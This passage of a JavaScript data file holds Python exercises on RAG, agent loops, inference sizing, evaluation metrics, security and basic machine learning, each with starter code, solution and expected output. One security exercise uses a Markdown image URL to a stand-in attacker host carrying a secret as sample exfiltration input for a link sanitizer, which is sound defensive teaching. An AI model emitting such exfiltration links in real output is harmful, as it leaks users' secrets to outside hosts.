const EXERCISES=[{"topic": "rag-chunking", "title": "Token chunker with overlap", "level": "core", "prompt": "Split a list of tokens into chunks of at most `size` tokens with `overlap` tokens shared between neighbours. Print the number of chunks and each chunk’s first and last token index.", "starter": "tokens = list(range(1000))   # stand-in for token ids\ndef chunk(tokens, size=300, overlap=50):\n    # TODO: step = size - overlap; stop once the end is covered\n    ...\ncs = chunk(tokens)\nprint(len(cs), [(c[0], c[-1]) for c in cs])", "solution": "tokens = list(range(1000))   # stand-in for token ids\ndef chunk(tokens, size=300, overlap=50):\n    step, out = size - overlap, []\n    for start in range(0, len(tokens), step):\n        out.append(tokens[start:start + size])\n        if start + size >= len(tokens):\n            break\n    return out\ncs = chunk(tokens)\nprint(len(cs), [(c[0], c[-1]) for c in cs])", "insight": "Four chunks cover 1,000 tokens: (1000 − 50) / 250 = 3.8, rounded up. The formula in the lesson predicts the count before you split.", "output": "4 [(0, 299), (250, 549), (500, 799), (750, 999)]"}, {"topic": "rag-context", "title": "Pack evidence into a token budget", "level": "challenge", "prompt": "Given scored chunks with token counts, drop near-duplicates (same text after lowercasing), then add chunks by score until the evidence budget is full. Finally order them so the best chunk is first and the second best is last.", "starter": "chunks = [  # (id, score, tokens, text)\n    ('c1', 0.91, 520, 'Refunds within 30 days'), ('c2', 0.88, 480, 'refunds within 30 days'),\n    ('c3', 0.80, 610, 'Annual plans prorated'), ('c4', 0.75, 450, 'Monthly plans no refund'),\n    ('c5', 0.60, 700, 'Contact support'), ('c6', 0.55, 300, 'Fees are 12%')]\nbudget = 8000 - 900 - 100 - 600 - 1000   # system, question, history, answer reserve\n# TODO: dedupe, greedy pack by score, then reorder best-first, second-best-last\nprint(...)", "solution": "chunks = [  # (id, score, tokens, text)\n    ('c1', 0.91, 520, 'Refunds within 30 days'), ('c2', 0.88, 480, 'refunds within 30 days'),\n    ('c3', 0.80, 610, 'Annual plans prorated'), ('c4', 0.75, 450, 'Monthly plans no refund'),\n    ('c5', 0.60, 700, 'Contact support'), ('c6', 0.55, 300, 'Fees are 12%')]\nbudget = 8000 - 900 - 100 - 600 - 1000   # system, question, history, answer reserve\nseen, picked, used = set(), [], 0\nfor cid, score, tok, text in sorted(chunks, key=lambda c: -c[1]):\n    key = text.lower()\n    if key in seen or used + tok > budget:\n        continue\n    seen.add(key); picked.append(cid); used += tok\norder = [picked[0]] + picked[2:] + [picked[1]] if len(picked) > 2 else picked\nprint(budget, used, picked, order)", "insight": "c2 is a case-only duplicate of c1 and is dropped. Putting the two strongest chunks at the edges works around lost-in-the-middle.", "output": "5400 2580 ['c1', 'c3', 'c4', 'c5', 'c6'] ['c1', 'c4', 'c5', 'c6', 'c3']"}, {"topic": "rag-caching", "title": "Cache keys that invalidate themselves", "level": "core", "prompt": "Build an answer-cache key from tenant, standalone question, corpus version and prompt version. Show that a re-ingest (corpus version bump) misses the old entry, and that two tenants never share an entry.", "starter": "import hashlib\ncache = {}\ndef key(tenant, question, corpus_v, prompt_v):\n    # TODO: normalize the question, hash all parts\n    ...\ncache[key('acme', 'Refund window for annual plans?', 7, 'p3')] = 'Annual: 30 days'\nprint(key('acme', 'refund window for annual plans? ', 7, 'p3') in cache,\n      key('acme', 'Refund window for annual plans?', 8, 'p3') in cache,\n      key('globex', 'Refund window for annual plans?', 7, 'p3') in cache)", "solution": "import hashlib\ncache = {}\ndef key(tenant, question, corpus_v, prompt_v):\n    q = ' '.join(question.lower().split())\n    raw = '|'.join([tenant, q, str(corpus_v), prompt_v])\n    return hashlib.sha256(raw.encode()).hexdigest()[:16]\ncache[key('acme', 'Refund window for annual plans?', 7, 'p3')] = 'Annual: 30 days'\nprint(key('acme', 'refund window for annual plans? ', 7, 'p3') in cache,\n      key('acme', 'Refund window for annual plans?', 8, 'p3') in cache,\n      key('globex', 'Refund window for annual plans?', 7, 'p3') in cache)", "insight": "True, False, False: normalization still hits, a re-ingest misses, and tenants are isolated. In production the question would be the standalone rewrite, not the raw message.", "output": "True False False"}, {"topic": "rag-access", "title": "Pre-filter versus post-filter retrieval", "level": "challenge", "prompt": "Search 8 chunks for a user allowed to see only tenant A. Compare post-filtering (top 4 from all, then drop forbidden) with pre-filtering (restrict, then take top 4).", "starter": "chunks = [('c1','B',.95),('c2','A',.93),('c3','B',.92),('c4','B',.90),\n          ('c5','A',.88),('c6','A',.85),('c7','B',.80),('c8','A',.78)]  # (id, tenant, score)\nallowed, k = {'A'}, 4\n# TODO: post-filter and pre-filter result lists\nprint(...)", "solution": "chunks = [('c1','B',.95),('c2','A',.93),('c3','B',.92),('c4','B',.90),\n          ('c5','A',.88),('c6','A',.85),('c7','B',.80),('c8','A',.78)]  # (id, tenant, score)\nallowed, k = {'A'}, 4\nranked = sorted(chunks, key=lambda c: -c[2])\npost = [c[0] for c in ranked[:k] if c[1] in allowed]\npre = [c[0] for c in ranked if c[1] in allowed][:k]\nprint('post-filter:', post, ' pre-filter:', pre)", "insight": "Post-filtering returns one chunk instead of four, and the scores of forbidden chunks were still computed and could leak through logs or caches.", "output": "post-filter: ['c2']  pre-filter: ['c2', 'c5', 'c6', 'c8']"}, {"topic": "h-loop", "title": "A minimal agent loop with budgets", "level": "challenge", "prompt": "Implement an agent loop around a scripted fake model: run requested tools, append results, stop when the model answers, when the same call repeats, or when the turn budget runs out. Print the transcript of actions and the stop reason.", "starter": "script = [  # what the fake model \"decides\" each turn\n    {'tool': 'search', 'args': {'q': 'refund policy'}},\n    {'tool': 'search', 'args': {'q': 'refund policy'}},   # a repeat\n    {'answer': 'Refunds within 30 days.'}]\ntools = {'search': lambda q: f'3 results for {q}'}\ndef run(script, max_turns=5):\n    transcript, seen = [], set()\n    # TODO: loop over turns; stop on answer, repeated call, or budget\n    ...\nprint(run(script))\nprint(run([{'tool': 'search', 'args': {'q': f'page {i}'}} for i in range(9)], max_turns=3))", "solution": "script = [  # what the fake model \"decides\" each turn\n    {'tool': 'search', 'args': {'q': 'refund policy'}},\n    {'tool': 'search', 'args': {'q': 'refund policy'}},   # a repeat\n    {'answer': 'Refunds within 30 days.'}]\ntools = {'search': lambda q: f'3 results for {q}'}\ndef run(script, max_turns=5):\n    transcript, seen = [], set()\n    for turn in range(max_turns):\n        if turn >= len(script):\n            return transcript, 'model stopped responding'\n        step = script[turn]\n        if 'answer' in step:\n            return transcript, 'answered: ' + step['answer']\n        call = (step['tool'], tuple(sorted(step['args'].items())))\n        if call in seen:\n            return transcript, f'stopped: repeated call {step[\"tool\"]}'\n        seen.add(call)\n        transcript.append((step['tool'], tools[step['tool']](**step['args'])))\n    return transcript, 'stopped: turn budget'\nprint(run(script))\nprint(run([{'tool': 'search', 'args': {'q': f'page {i}'}} for i in range(9)], max_turns=3))", "insight": "Loop detection catches the repeat before it burns budget. Real harnesses also cap tokens, time and spend.", "output": "([('search', '3 results for refund policy')], 'stopped: repeated call search')\n([('search', '3 results for page 0'), ('search', '3 results for page 1'), ('search', '3 results for page 2')], 'stopped: turn budget')"}, {"topic": "h-failures", "title": "Retries with exponential backoff and jitter", "level": "core", "prompt": "Write a retry helper that retries only transient errors (429, 503, timeouts) with capped exponential backoff and jitter, and gives up after 4 attempts. Use a fixed random seed so the delays are reproducible.", "starter": "import random\nrandom.seed(7)\nclass Transient(Exception): pass\ncalls = {'n': 0}\ndef flaky():\n    calls['n'] += 1\n    if calls['n'] < 3: raise Transient('503')\n    return 'ok'\ndef retry(fn, attempts=4, base=0.5, cap=8.0):\n    delays = []\n    # TODO: try; on Transient record delay = min(cap, base * 2**i) * random.uniform(0.5, 1)\n    ...\nprint(retry(flaky))", "solution": "import random\nrandom.seed(7)\nclass Transient(Exception): pass\ncalls = {'n': 0}\ndef flaky():\n    calls['n'] += 1\n    if calls['n'] < 3: raise Transient('503')\n    return 'ok'\ndef retry(fn, attempts=4, base=0.5, cap=8.0):\n    delays = []\n    for i in range(attempts):\n        try:\n            return fn(), [round(d, 3) for d in delays]\n        except Transient:\n            if i == attempts - 1:\n                raise\n            delays.append(min(cap, base * 2 ** i) * random.uniform(0.5, 1))\nprint(retry(flaky))", "insight": "In real code you would sleep for each delay. Validation errors should not be retried at all; return them to the model instead.", "output": "('ok', [0.331, 0.575])"}, {"topic": "h-context", "title": "Agent token growth and the value of caching", "level": "core", "prompt": "A 10-turn agent run starts with a 2,000-token prefix and adds 1,500 tokens per turn. Compute total input tokens, the cost at $3 per million, and the cost if the stable 2,000-token prefix is cached at 10% of the price.", "starter": "P, D, T, price = 2000, 1500, 10, 3 / 1_000_000\n# TODO\nprint(...)", "solution": "P, D, T, price = 2000, 1500, 10, 3 / 1_000_000\nper_turn = [P + D * t for t in range(T)]\ntotal = sum(per_turn)\ncached = sum(0.1 * P + D * t for t in range(T))\nprint(total, P * T + D * T * (T - 1) // 2, round(total * price, 4), round(cached * price, 4))", "insight": "Caching only the fixed prefix saves about 21% here; caching the growing transcript too (providers cache any repeated prefix) saves far more.", "output": "87500 87500 0.2625 0.2085"}, {"topic": "inf-kv", "title": "KV-cache and concurrency calculator", "level": "core", "prompt": "Compute KV-cache bytes per token for an 80-layer model with 8 KV heads of dimension 128 in BF16, the size of an 8,192-token sequence, and how many such sequences fit next to the weights on one or two 80 GB GPUs at 90% utilization, for FP8 weights (70B parameters).", "starter": "GiB = 2**30\nlayers, kv_heads, head_dim, bytes_ = 80, 8, 128, 2\nweights_gib = 70e9 * 1 / GiB          # FP8: one byte per weight\ngpu_gib = 80e9 / GiB                  # an \"80 GB\" GPU\n# TODO: per-token KV, per-sequence KV at 8192 tokens, sequences that fit on 1 and 2 GPUs\nprint(...)", "solution": "GiB = 2**30\nlayers, kv_heads, head_dim, bytes_ = 80, 8, 128, 2\nweights_gib = 70e9 * 1 / GiB          # FP8: one byte per weight\ngpu_gib = 80e9 / GiB                  # an \"80 GB\" GPU\nper_tok = 2 * layers * kv_heads * head_dim * bytes_\nper_seq = per_tok * 8192 / GiB\nfor gpus in (1, 2):\n    free = gpus * gpu_gib * 0.9 - weights_gib\n    print(gpus, 'GPU(s): free', round(free, 2), 'GiB ->', int(free // per_seq), 'sequences of 8k')\nprint(per_tok, round(per_seq, 2))", "insight": "One GPU leaves room for no full 8k sequence; two GPUs leave about 69 GiB, enough for 27. That is why 70B-class models are usually served on two or more GPUs.", "output": "1 GPU(s): free 1.86 GiB -> 0 sequences of 8k\n2 GPU(s): free 68.92 GiB -> 27 sequences of 8k\n327680 2.5"}, {"topic": "inf-metrics", "title": "Percentiles and goodput from request logs", "level": "core", "prompt": "From simulated per-request TTFT and TPOT samples (seed 0), report P50, P90 and P99 for each, and goodput for the SLO TTFT ≤ 1.0 s and TPOT ≤ 50 ms.", "starter": "import numpy as np\nrng = np.random.default_rng(0)\nttft = rng.lognormal(mean=np.log(0.45), sigma=0.6, size=2000)     # seconds\ntpot = rng.lognormal(mean=np.log(0.012), sigma=0.7, size=2000)    # seconds\n# TODO: percentiles and goodput\nprint(...)", "solution": "import numpy as np\nrng = np.random.default_rng(0)\nttft = rng.lognormal(mean=np.log(0.45), sigma=0.6, size=2000)     # seconds\ntpot = rng.lognormal(mean=np.log(0.012), sigma=0.7, size=2000)    # seconds\npct = lambda a: [round(float(x), 3) for x in np.percentile(a, [50, 90, 99])]\ngood = ((ttft <= 1.0) & (tpot <= 0.050)).mean()\nprint('TTFT', pct(ttft), 'TPOT', pct(tpot), 'mean TPOT', round(float(tpot.mean()), 4), 'goodput', round(float(good), 3))", "insight": "The mean sits well below P99. Goodput counts a request only if both SLOs hold.", "output": "TTFT [0.441, 0.963, 1.741] TPOT [0.012, 0.03, 0.064] mean TPOT 0.0153 goodput 0.889"}, {"topic": "inf-spec", "title": "Speculative decoding: formula versus simulation", "level": "core", "prompt": "Compute expected tokens per target pass with acceptance rate α and k drafted tokens, then check it by simulating 100,000 verification steps (seed 1).", "starter": "import random\nrandom.seed(1)\ndef expected(a, k): ...           # TODO: (1 - a**(k+1)) / (1 - a)\ndef simulate(a, k, n=100_000):\n    # TODO: per step accept drafts until the first rejection (max k), then +1 target token\n    ...\nfor a, k in [(0.6, 3), (0.8, 4)]:\n    print(a, k, round(expected(a, k), 3), round(simulate(a, k), 3))", "solution": "import random\nrandom.seed(1)\ndef expected(a, k): return (1 - a ** (k + 1)) / (1 - a)\ndef simulate(a, k, n=100_000):\n    total = 0\n    for _ in range(n):\n        accepted = 0\n        while accepted < k and random.random() < a:\n            accepted += 1\n        total += accepted + 1\n    return total / n\nfor a, k in [(0.6, 3), (0.8, 4)]:\n    print(a, k, round(expected(a, k), 3), round(simulate(a, k), 3))", "output": "0.6 3 2.176 2.177\n0.8 4 3.362 3.37"}, {"topic": "ev-metrics", "title": "Recall@k, MRR and nDCG", "level": "core", "prompt": "Implement recall@k, precision@k, MRR and nDCG@k for one ranked list with binary relevance, and check the lesson’s worked example.", "starter": "import math\nranking, relevant = ['d1', 'd2', 'd3', 'd4', 'd5', 'd6'], {'d2', 'd5'}\ndef recall_at(k): ...\ndef precision_at(k): ...\ndef mrr(): ...\ndef ndcg_at(k): ...\nprint(recall_at(3), recall_at(5), precision_at(5), mrr(), round(ndcg_at(5), 3))", "solution": "import math\nranking, relevant = ['d1', 'd2', 'd3', 'd4', 'd5', 'd6'], {'d2', 'd5'}\ndef recall_at(k): return len(set(ranking[:k]) & relevant) / len(relevant)\ndef precision_at(k): return len(set(ranking[:k]) & relevant) / k\ndef mrr(): return next((1 / (i + 1) for i, d in enumerate(ranking) if d in relevant), 0.0)\ndef ndcg_at(k):\n    dcg = sum(1 / math.log2(i + 2) for i, d in enumerate(ranking[:k]) if d in relevant)\n    ideal = sum(1 / math.log2(i + 2) for i in range(min(k, len(relevant))))\n    return dcg / ideal\nprint(recall_at(3), recall_at(5), precision_at(5), mrr(), round(ndcg_at(5), 3))", "output": "0.5 1.0 0.4 0.5 0.624"}, {"topic": "ev-agents", "title": "pass@k and pass^k", "level": "core", "prompt": "From n = 10 runs with c = 3 successes, compute unbiased pass@k for k = 1, 3, 5. Then, for an agent with 80% per-run success, compute pass^k (all of k runs succeed) for k = 1, 3, 5.", "starter": "from math import comb\nn, c = 10, 3\n# TODO: pass@k = 1 - C(n - c, k) / C(n, k);  pass^k = p ** k\nprint(...)", "solution": "from math import comb\nn, c = 10, 3\npass_at = {k: round(1 - comb(n - c, k) / comb(n, k), 4) for k in (1, 3, 5)}\npass_hat = {k: round(0.8 ** k, 4) for k in (1, 3, 5)}\nprint(pass_at, pass_hat)", "insight": "pass@k rewards “at least once”, which flatters agents; pass^k shows how quickly reliability falls when users run a task repeatedly.", "output": "{1: 0.3, 3: 0.7083, 5: 0.9167} {1: 0.8, 3: 0.512, 5: 0.3277}"}, {"topic": "ev-judge", "title": "Calibrating a judge with Cohen’s kappa", "level": "core", "prompt": "Compute raw agreement, chance agreement and Cohen’s kappa between a judge and human labels from a 2×2 table.", "starter": "both_pass, judge_pass_human_fail, judge_fail_human_pass, both_fail = 60, 12, 8, 20\n# TODO\nprint(...)", "solution": "both_pass, judge_pass_human_fail, judge_fail_human_pass, both_fail = 60, 12, 8, 20\nn = both_pass + judge_pass_human_fail + judge_fail_human_pass + both_fail\npo = (both_pass + both_fail) / n\npj = (both_pass + judge_pass_human_fail) / n\nph = (both_pass + judge_fail_human_pass) / n\npe = pj * ph + (1 - pj) * (1 - ph)\nprint(po, round(pe, 3), round((po - pe) / (1 - pe), 3))", "output": "0.8 0.579 0.525"}, {"topic": "ev-stats", "title": "Wilson confidence intervals", "level": "core", "prompt": "Implement the Wilson score interval and compare 42/50 with 420/500 passes.", "starter": "import math\ndef wilson(x, n, z=1.96):\n    # TODO\n    ...\nprint([round(v, 3) for v in wilson(42, 50)], [round(v, 3) for v in wilson(420, 500)])", "solution": "import math\ndef wilson(x, n, z=1.96):\n    p = x / n\n    d = 1 + z * z / n\n    centre = p + z * z / (2 * n)\n    half = z * math.sqrt(p * (1 - p) / n + z * z / (4 * n * n))\n    return (centre - half) / d, (centre + half) / d\nprint([round(v, 3) for v in wilson(42, 50)], [round(v, 3) for v in wilson(420, 500)])", "insight": "Same 84% pass rate, very different certainty: ten times the data shrinks the interval about three-fold.", "output": "[0.715, 0.917] [0.805, 0.87]"}, {"topic": "sec-output", "title": "Sanitize links and images in model output", "level": "core", "prompt": "Rewrite Markdown so images and links only point to allowlisted domains; replace others with a plain “[link removed]”. Test with an exfiltration attempt.", "starter": "import re\nfrom urllib.parse import urlparse\nALLOWED = {'docs.example.com', 'cdn.example.com'}\ndef sanitize(md):\n    # TODO: match ![alt](url) and [text](url); keep only allowlisted hosts\n    ...\nout = 'See ![chart](https://cdn.example.com/a.png) and [policy](https://docs.example.com/p) ![x](https://evil.test/?d=SECRET123)'\nprint(sanitize(out))", "solution": "import re\nfrom urllib.parse import urlparse\nALLOWED = {'docs.example.com', 'cdn.example.com'}\ndef sanitize(md):\n    def fix(m):\n        url = m.group(2).strip()\n        host = urlparse(url).hostname or ''\n        return m.group(0) if urlparse(url).scheme == 'https' and host in ALLOWED else '[link removed]'\n    return re.sub(r'!?\\[([^\\]]*)\\]\\(([^)\\s]+)\\)', fix, md)\nout = 'See ![chart](https://cdn.example.com/a.png) and [policy](https://docs.example.com/p) ![x](https://evil.test/?d=SECRET123)'\nprint(sanitize(out))", "insight": "Run this server-side before rendering. Also block raw HTML and auto-linked bare URLs, which this small version does not handle.", "output": "See ![chart](https://cdn.example.com/a.png) and [policy](https://docs.example.com/p) [link removed]"}, {"topic": "sec-dos", "title": "A token-bucket rate limiter", "level": "core", "prompt": "Implement a token bucket (capacity 10, refill 2 per second). Replay a burst of 15 requests at t = 0, then 5 more at t = 3 s, and print how many were allowed in each wave.", "starter": "class Bucket:\n    def __init__(self, capacity, rate):\n        self.capacity, self.rate, self.tokens, self.t = capacity, rate, capacity, 0.0\n    def allow(self, now, cost=1):\n        # TODO: refill by rate * elapsed (up to capacity), then spend if enough\n        ...\nb = Bucket(10, 2)\nwave1 = sum(b.allow(0.0) for _ in range(15)); wave2 = sum(b.allow(3.0) for _ in range(5))\nprint(wave1, wave2)", "solution": "class Bucket:\n    def __init__(self, capacity, rate):\n        self.capacity, self.rate, self.tokens, self.t = capacity, rate, capacity, 0.0\n    def allow(self, now, cost=1):\n        self.tokens = min(self.capacity, self.tokens + self.rate * (now - self.t))\n        self.t = now\n        if self.tokens >= cost:\n            self.tokens -= cost\n            return True\n        return False\nb = Bucket(10, 2)\nwave1 = sum(b.allow(0.0) for _ in range(15)); wave2 = sum(b.allow(3.0) for _ in range(5))\nprint(wave1, wave2)", "insight": "The burst spends the 10 stored tokens; 3 seconds later 6 have refilled, so 5 of 5 pass. Charge expensive calls more than 1 token.", "output": "10 5"}, {"topic": "ml-linear", "title": "OLS from scratch", "level": "core", "prompt": "Implement simple linear regression with the closed-form OLS formulas. Print the slope and intercept rounded to 3 decimals, then check them against numpy.polyfit.", "starter": "import numpy as np\nx = np.array([1, 2, 3, 4, 5, 6, 7, 8], dtype=float)\ny = np.array([1.8, 3.6, 3.4, 5.6, 5.0, 7.4, 6.6, 9.0])\n\ndef ols(x, y):\n    # TODO: return slope m and intercept b\n    ...\n\nm, b = ols(x, y)\nprint(round(m, 3), round(b, 3))\nprint(np.round(np.polyfit(x, y, 1), 3))", "solution": "import numpy as np\nx = np.array([1, 2, 3, 4, 5, 6, 7, 8], dtype=float)\ny = np.array([1.8, 3.6, 3.4, 5.6, 5.0, 7.4, 6.6, 9.0])\n\ndef ols(x, y):\n    xm, ym = x.mean(), y.mean()\n    m = ((x - xm) * (y - ym)).sum() / ((x - xm) ** 2).sum()\n    b = ym - m * xm\n    return m, b\n\nm, b = ols(x, y)\nprint(round(m, 3), round(b, 3))\nprint(np.round(np.polyfit(x, y, 1), 3))", "output": "0.914 1.186\n[0.914 1.186]"}, {"topic": "ml-gd", "title": "Batch gradient descent for linear regression", "level": "core", "prompt": "Fit the same data with batch gradient descent on MSE (learning rate 0.01, 5,000 epochs, start at m = b = 0). The result should approach the OLS answer.", "starter": "import numpy as np\nx = np.array([1, 2, 3, 4, 5, 6, 7, 8], dtype=float)\ny = np.array([1.8, 3.6, 3.4, 5.6, 5.0, 7.4, 6.6, 9.0])\nm, b, lr = 0.0, 0.0, 0.01\nfor epoch in range(5000):\n    y_hat = m * x + b\n    # TODO: compute dm, db (gradients of MSE) and update m, b\n    ...\nprint(round(m, 3), round(b, 3))", "solution": "import numpy as np\nx = np.array([1, 2, 3, 4, 5, 6, 7, 8], dtype=float)\ny = np.array([1.8, 3.6, 3.4, 5.6, 5.0, 7.4, 6.6, 9.0])\nm, b, lr = 0.0, 0.0, 0.01\nn = len(x)\nfor epoch in range(5000):\n    y_hat = m * x + b\n    dm = -2 / n * ((y - y_hat) * x).sum()\n    db = -2 / n * (y - y_hat).sum()\n    m -= lr * dm\n    b -= lr * db\nprint(round(m, 3), round(b, 3))", "output": "0.914 1.186"}, {"topic": "ml-metrics", "title": "Regression metrics by hand", "level": "core", "prompt": "Compute MAE, MSE, RMSE, R² and adjusted R² (p = 1 feature) for the predictions below. Round to 3 decimals.", "starter": "import numpy as np\ny = np.array([3.0, 5.0, 7.5, 9.0, 11.0])\ny_hat = np.array([2.5, 5.5, 7.0, 9.5, 10.0])\nn, p = len(y), 1\n# TODO: mae, mse, rmse, r2, adj_r2\nprint(...)", "solution": "import numpy as np\ny = np.array([3.0, 5.0, 7.5, 9.0, 11.0])\ny_hat = np.array([2.5, 5.5, 7.0, 9.5, 10.0])\nn, p = len(y), 1\nmae = np.abs(y - y_hat).mean()\nmse = ((y - y_hat) ** 2).mean()\nrmse = mse ** 0.5\nr2 = 1 - ((y - y_hat) ** 2).sum() / ((y - y.mean()) ** 2).sum()\nadj = 1 - (1 - r2) * (n - 1) / (n - p - 1)\nprint(round(mae, 3), round(mse, 3), round(rmse, 3), round(r2, 3), round(adj, 3))", "output": "0.6 0.4 0.632 0.95 0.934"}, {"topic": "ml-scaling", "title": "Scale without leakage", "level": "core", "prompt": "Fit a standard scaler and a min-max scaler on the training set only, then transform the test set. Print the transformed test values.", "starter": "import numpy as np\ntrain = np.array([10., 20., 30., 40., 50.])\ntest = np.array([25., 60.])\n# TODO: z-score and min-max using TRAIN statistics only\nprint(...)", "solution": "import numpy as np\ntrain = np.array([10., 20., 30., 40., 50.])\ntest = np.array([25., 60.])\nmu, sd = train.mean(), train.std()\nmn, mx = train.min(), train.max()\nprint(np.round((test - mu) / sd, 3))\nprint(np.round((test - mn) / (mx - mn), 3))", "output": "[-0.354  2.121]\n[0.375 1.25 ]"}, {"topic": "ml-logistic", "title": "Logistic regression with gradient descent", "level": "core", "prompt": "Train logistic regression on one feature (learning rate 0.5, 2,000 epochs). Print the learned weights and the training accuracy.", "starter": "import numpy as np\nx = np.array([0.5, 1.0, 1.5, 2.0, 3.0, 3.5, 4.0, 4.5])\ny = np.array([0, 0, 0, 0, 1, 1, 1, 1])\nw, b, lr = 0.0, 0.0, 0.5\nsigmoid = lambda z: 1 / (1 + np.exp(-z))\nfor _ in range(2000):\n    p = sigmoid(w * x + b)\n    # TODO: gradients of log loss: dw = mean((p - y) * x), db = mean(p - y); update\n    ...\nprint(round(w, 2), round(b, 2), ((sigmoid(w * x + b) >= 0.5) == y).mean())", "solution": "import numpy as np\nx = np.array([0.5, 1.0, 1.5, 2.0, 3.0, 3.5, 4.0, 4.5])\ny = np.array([0, 0, 0, 0, 1, 1, 1, 1])\nw, b, lr = 0.0, 0.0, 0.5\nsigmoid = lambda z: 1 / (1 + np.exp(-z))\nfor _ in range(2000):\n    p = sigmoid(w * x + b)\n    w -= lr * ((p - y) * x).mean()\n    b -= lr * (p - y).mean()\nprint(round(w, 2), round(b, 2), ((sigmoid(w * x + b) >= 0.5) == y).mean())", "output": "5.11 -12.57 1.0", "insight": "The classes are perfectly separable, so the weights keep growing with more epochs. Regularization (or early stopping) keeps them finite."}, {"topic": "ml-class-metrics", "title": "Confusion matrix, precision, recall, F1", "level": "core", "prompt": "From true and predicted labels, compute TP, FP, FN, TN, precision, recall and F1 (positive class = 1).", "starter": "y_true = [1, 0, 1, 1, 0, 0, 1, 0, 1, 0]\ny_pred = [1, 0, 0, 1, 0, 1, 1, 0, 0, 0]\n# TODO: count TP, FP, FN, TN; compute precision, recall, F1\nprint(...)", "solution": "y_true = [1, 0, 1, 1, 0, 0, 1, 0, 1, 0]\ny_pred = [1, 0, 0, 1, 0, 1, 1, 0, 0, 0]\npairs = list(zip(y_true, y_pred))\ntp = pairs.count((1, 1)); fp = pairs.count((0, 1))\nfn = pairs.count((1, 0)); tn = pairs.count((0, 0))\nprecision = tp / (tp + fp); recall = tp / (tp + fn)\nf1 = 2 * precision * recall / (precision + recall)\nprint(tp, fp, fn, tn, round(precision, 3), round(recall, 3), round(f1, 3))", "output": "3 1 2 4 0.75 0.6 0.667"}, {"topic": "ml-trees", "title": "Entropy and information gain", "level": "core", "prompt": "Compute the entropy of the parent node and the information gain of a split that sends [yes, yes, yes, no] left and [yes, no, no, no] right.", "starter": "from math import log2\ndef entropy(labels):\n    # TODO\n    ...\nparent = ['yes'] * 4 + ['no'] * 4\nleft, right = ['yes', 'yes', 'yes', 'no'], ['yes', 'no', 'no', 'no']\nprint(...)", "solution": "from math import log2\nfrom collections import Counter\ndef entropy(labels):\n    n = len(labels)\n    return -sum(c / n * log2(c / n) for c in Counter(labels).values())\nparent = ['yes'] * 4 + ['no'] * 4\nleft, right = ['yes', 'yes', 'yes', 'no'], ['yes', 'no', 'no', 'no']\nig = entropy(parent) - (len(left) / 8 * entropy(left) + len(right) / 8 * entropy(right))\nprint(round(entropy(parent), 3), round(entropy(left), 3), round(ig, 3))", "output": "1.0 0.811 0.189"}, {"topic": "ml-knn", "title": "K-nearest neighbors from scratch", "level": "core", "prompt": "Classify the query point with k = 3 using Euclidean distance and a majority vote.", "starter": "import numpy as np\nfrom collections import Counter\nX = np.array([[1, 1], [1, 2], [2, 1], [6, 6], [6, 7], [7, 6]])\ny = np.array(['A', 'A', 'A', 'B', 'B', 'B'])\nquery = np.array([5, 5])\n# TODO: distances, 3 nearest, majority label\nprint(...)", "solution": "import numpy as np\nfrom collections import Counter\nX = np.array([[1, 1], [1, 2], [2, 1], [6, 6], [6, 7], [7, 6]])\ny = np.array(['A', 'A', 'A', 'B', 'B', 'B'])\nquery = np.array([5, 5])\nd = np.sqrt(((X - query) ** 2).sum(axis=1))\nnearest = np.argsort(d)[:3]\nprint(np.round(d[nearest], 3), Counter(y[nearest]).most_common(1)[0][0])", "output": "[1.414 2.236 2.236] B"}, {"topic": "ml-kmeans", "title": "K-means from scratch", "level": "core", "prompt": "Run K-means with k = 2, starting centroids at the first two points, until the assignments stop changing. Print the final centroids and the number of iterations.", "starter": "import numpy as np\nX = np.array([[1, 1], [1.5, 2], [3, 4], [5, 7], [3.5, 5], [4.5, 5], [3.5, 4.5]])\nC = X[:2].copy()\n# TODO: loop: assign to nearest centroid, recompute means, stop when stable\nprint(...)", "solution": "import numpy as np\nX = np.array([[1, 1], [1.5, 2], [3, 4], [5, 7], [3.5, 5], [4.5, 5], [3.5, 4.5]])\nC = X[:2].copy()\nlabels, it = None, 0\nwhile True:\n    it += 1\n    new = np.argmin(((X[:, None, :] - C[None]) ** 2).sum(axis=2), axis=1)\n    if labels is not None and (new == labels).all():\n        break\n    labels = new\n    C = np.array([X[labels == k].mean(axis=0) for k in range(2)])\nprint(np.round(C, 3).tolist(), labels.tolist(), it)", "output": "[[1.25, 1.5], [3.9, 5.1]] [0, 0, 1, 1, 1, 1, 1] 3"}, {"topic": "ml-pca", "title": "PCA with an eigen-decomposition", "level": "core", "prompt": "Center the data, compute the covariance matrix, take eigenvalues and eigenvectors, and print the explained-variance ratio of each component.", "starter": "import numpy as np\nX = np.array([[2.5, 2.4], [0.5, 0.7], [2.2, 2.9], [1.9, 2.2], [3.1, 3.0],\n              [2.3, 2.7], [2.0, 1.6], [1.0, 1.1], [1.5, 1.6], [1.1, 0.9]])\n# TODO: center, covariance (n - 1), np.linalg.eigh, sort descending, ratio\nprint(...)", "solution": "import numpy as np\nX = np.array([[2.5, 2.4], [0.5, 0.7], [2.2, 2.9], [1.9, 2.2], [3.1, 3.0],\n              [2.3, 2.7], [2.0, 1.6], [1.0, 1.1], [1.5, 1.6], [1.1, 0.9]])\nXc = X - X.mean(axis=0)\nC = Xc.T @ Xc / (len(X) - 1)\nvals, vecs = np.linalg.eigh(C)\norder = np.argsort(vals)[::-1]\nvals = vals[order]\nprint(np.round(vals, 4), np.round(vals / vals.sum(), 4))", "output": "[1.284  0.0491] [0.9632 0.0368]"}, {"topic": "ml-naive-bayes", "title": "Naive Bayes with Laplace smoothing", "level": "challenge", "prompt": "Build a categorical Naive Bayes on the tiny weather data and predict whether to play when outlook = sunny and wind = strong. Use Laplace smoothing with alpha = 1 and print both class scores (unnormalized) and the prediction.", "starter": "from collections import Counter\ndata = [('sunny','weak','no'), ('sunny','strong','no'), ('overcast','weak','yes'),\n        ('rain','weak','yes'), ('rain','strong','no'), ('overcast','strong','yes'),\n        ('sunny','weak','yes'), ('rain','weak','yes')]\nquery = ('sunny', 'strong')\n# TODO: prior P(c) and smoothed likelihoods P(x_i | c); multiply; argmax\nprint(...)", "solution": "from collections import Counter\ndata = [('sunny','weak','no'), ('sunny','strong','no'), ('overcast','weak','yes'),\n        ('rain','weak','yes'), ('rain','strong','no'), ('overcast','strong','yes'),\n        ('sunny','weak','yes'), ('rain','weak','yes')]\nquery = ('sunny', 'strong')\nclasses = Counter(r[2] for r in data)\nvalues = [set(r[i] for r in data) for i in range(2)]\nscores = {}\nfor c, nc in classes.items():\n    s = nc / len(data)\n    for i, v in enumerate(query):\n        count = sum(1 for r in data if r[2] == c and r[i] == v)\n        s *= (count + 1) / (nc + 